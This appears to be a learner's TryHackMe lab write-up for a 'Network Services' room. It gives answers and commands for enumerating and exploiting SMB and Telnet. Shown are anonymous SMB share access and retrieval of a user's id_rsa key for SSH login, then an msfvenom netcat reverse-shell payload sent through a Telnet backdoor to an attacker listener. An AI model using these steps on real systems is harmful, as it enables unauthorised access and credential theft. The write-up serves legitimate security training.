# Network Services

## Understanding SMB
```
  1. What does SMB stand for?
     a. Server message block - a network protocol that allows devices to share files, printers, and other resources across a network.
  2. What type of protocol is SMB?
     a. reponse-request - A message exchange pattern which allows two applications to have a twp-way conversation over a channel.
  3. What do clients connect to servers using?
     a. TCP/IP - A collection of protocols that govern how devices communicate and transmit data over the internet.
  4. What systems does Samba run on?
     a. Unix
```

## Enumerating SMB
```
1. Conduct an nmap scan of your choosing, How many ports are open?
  a. 3. Found using command 'nmap -sS- -p- -vv <target ip>'. Discovered open ports 22/tcp, 445/tcp, 139/tcp.
2. What ports is SMB running on?
  a. 139/445
3. Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?
  a. WORKGROUP. Used the command enum4linux -a <target ip> which does a full basic enumeration.
4. What comes up as the name of the machine?
  a. POLOSMB, also discovered using the previous command.
5. What operating system version is running?
  a. 6.1, also discovered using the previous command under "OS information" in thee enumeration output.
6. What share sticks out as something we might want to investigate?
  a. profiles. Out of all the shares listed under share enumeraiton, profiles suggest we might be able to find user credentials to infiltrate the network.
```

## Exploting SMB
```
1. What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?
  a. smbclient //10.10.10.2/secret -U suit -p 445
2. Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. Does the share allow anonymous access? Y/N?
  a. Yes. I determined this using the command 'smbclient //<target ip?/profiles -U anonymous'.
3. Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
  a. John Catcus. I used the command 'get "Working From Home Information.txt"' to download the file to my machine.
4. What service has been configured to allow him to work from home?
  a. ssh. This is stated in the document we retrieved.
5. Okay! Now we know this, what directory on the share should we look in?
  a. .ssh. This will contain the information about connecting over SSH.
6. This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
  a. id_rsa. This is John Cactus's private key which will allow us to SSH into the server.
Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".
Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.
7. What is the smb.txt flag?
  a. THM{smb_is_fun_eh?}. This was found by ssh-ing into the remote server with John's credentials. I used the command ssh cactus@<target ip> -i id_rsa to connect, then searched the directory for the flag with the ls and cat commands.

```

## Understanding Telnet
```
1. What is Telnet?
  a. Application protocol
2. What has slowly replaced Telnet?
  a. ssh
3. How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
  a. telnet 10.10.10.3 23
4. The lack of what, means that all Telnet communication is in plaintext?
  a. Encryption
```
  
## Enumerating Telnet
```
1. How many ports are open on the target machine?
  a. 1 - Found using command 'nmap -sS -vv -p- <target ip>'
2. What port is this?
  a. 8012 - Found with the above command.
3. This port is unassigned, but still lists the protocol it's using, what protocol is this?
  a. tcp - Found with the above command.
4. Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
  a. 0 - Found using command 'nmap -sS -vv <target ip>'. Since the open port is above 1000 it is not checked.
5. Based on the title returned to us, what do we think this port could be used for?
  a. a backdoor - Used command 'telnet <target ip> 8012' to connect to the remote server.
6. Who could it belong to? Gathering possible usernames is an important step in enumeration.
  a. Skidy - The output is "SKIDY'S BACKDOOR".
```

## Exploting Telnet
```
1. Great! It's an open telnet connection! What welcome message do we receive?
  a. SKIDY'S BACKDOOR.
2. Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)
  a. N
3. Start a tcpdump listener on your local machine. Command: 'sudo tcpdump ip proto \\icmp -i ens5'. This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.
4. Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)
  a. Y. Used the command '.RUN ping <attackbox ip> -c 1' in the telnet terminal.
5. We're going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. What word does the generated payload start with?
  a. mkfifo - Used the command 'msfvenom -p cmd/unix/reverse_netcat lhost=<attackbox ip> lport=4444 R'.
6. Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. What would the command look like for the listening port we selected in our payload?
  a. nc -lvp 4444
7. Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine! Success! What is the contents of flag.txt?
  a. THM{y0u_g0t_th3_t3ln3t_fl4g}

```

## Understanding FTP

## Enumerating FTP

## Exploiting FTP
